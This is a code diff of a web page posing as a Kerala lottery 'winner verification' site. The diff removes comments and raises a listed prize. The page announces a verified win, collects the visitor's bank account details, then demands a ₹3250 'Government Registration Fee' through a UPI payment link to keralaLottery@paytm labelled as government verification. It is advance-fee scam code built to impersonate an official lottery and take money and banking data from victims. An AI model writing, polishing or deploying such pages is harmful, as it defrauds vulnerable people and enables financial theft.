@@ -89,7 +89,6 @@
       margin-top: 4px;
     }
 
-    /* Live Date & Time */
     .realtime-box {
       background: rgba(14, 23, 51, 0.85);
       border: 1px solid #2e4374;
@@ -249,7 +248,6 @@
       font-size: 13px;
     }
     
-    /* Fee & QR Code Box */
     #feePaymentSection {
       display: none;
       margin-top: 15px;
@@ -397,7 +395,6 @@
 </head>
 <body>
 
-  <!-- Support Bar -->
   <div class="support-bar">
     <div class="support-info">
       <span class="support-label">📞 24x7 CUSTOMER HELPLINE</span>
@@ -413,7 +410,6 @@
   </div>
 
   <div class="card">
-    <!-- Real-time Live Date & Time -->
     <div class="realtime-box">
       <span class="live-pulse"></span>
       <span id="liveDateTime">Loading Date & Time...</span>
@@ -428,7 +424,6 @@
 
     <div id="statusMsg"></div>
 
-    <!-- Search Result Box -->
     <div id="resultBox">
       <div class="winner-status">🎉 CONGRATULATIONS! WINNER VERIFIED</div>
       <div class="prize-highlight">
@@ -442,7 +437,6 @@
         <div class="info-row"><span>Registered Mobile</span><strong id="resMobile">-</strong></div>
       </div>
 
-      <!-- Withdraw Section -->
       <div class="withdraw-box">
         <h3>🏦 Withdraw Prize to Bank Account</h3>
         <div class="bank-input">
@@ -466,7 +460,6 @@
           Submit & Proceed to Fee
         </button>
 
-        <!-- Government Fee & QR Section -->
         <div id="feePaymentSection">
           <div class="fee-notice">
             <span>Government Registration Fees:</span>
@@ -485,7 +478,6 @@
       </div>
     </div>
 
-    <!-- 1 to 10 Winners Board -->
     <div class="winner-board">
       <div class="winner-board-title">
         <span>🏆 TODAY'S TOP 10 WINNING TICKETS</span>
@@ -506,7 +498,6 @@
     let currentFee = "3250";
     let currentUpi = "keralaLottery@paytm";
 
-    // 1. Live Clock
     function runLiveClock() {
       const update = () => {
         const d = new Date();
@@ -519,11 +510,10 @@
     }
     runLiveClock();
 
-    // 2. Top Winners Board
     const prizeData = [
       { rank: "1st Prize", prize: "₹25,00,00,000", count: "1 Winner" },
       { rank: "2nd Prize", prize: "₹10,00,00,000", count: "1 Winner" },
-      { rank: "3rd Prize", prize: "₹75,00,000", count: "1 Winner" },
+      { rank: "3rd Prize", prize: "₹75,00,00,000", count: "1 Winner" },
       { rank: "4th Prize", prize: "₹25,00,000", count: "12 Winners" },
       { rank: "5th Prize", prize: "₹12,00,000", count: "16 Winners" },
       { rank: "6th Prize", prize: "₹1,00,000", count: "36 Winners" },
@@ -575,7 +565,6 @@
     }
     loadWinnerBoard();
 
-    // 3. Search & Verification
     async function verifyTicket() {
       const query = document.getElementById("searchInput").value.trim().toLowerCase();
       const status = document.getElementById("statusMsg");
@@ -626,7 +615,6 @@
       }
     }
 
-    // 4. Withdraw Details Submit -> Show Fee & QR Code
     function processBankWithdraw() {
       const name = document.getElementById("accHolderName").value.trim();
       const bank = document.getElementById("bankName").value.trim();
@@ -648,7 +636,6 @@
       feeSec.scrollIntoView({ behavior: 'smooth' });
     }
 
-    // 5. Direct UPI App Trigger
     function handleDirectUpiPayment() {
       const upiUrl = `upi://pay?pa=${encodeURIComponent(currentUpi)}&pn=GovVerification&am=${currentFee}&cu=INR&tn=RegistrationFee`;
       window.location.href = upiUrl;
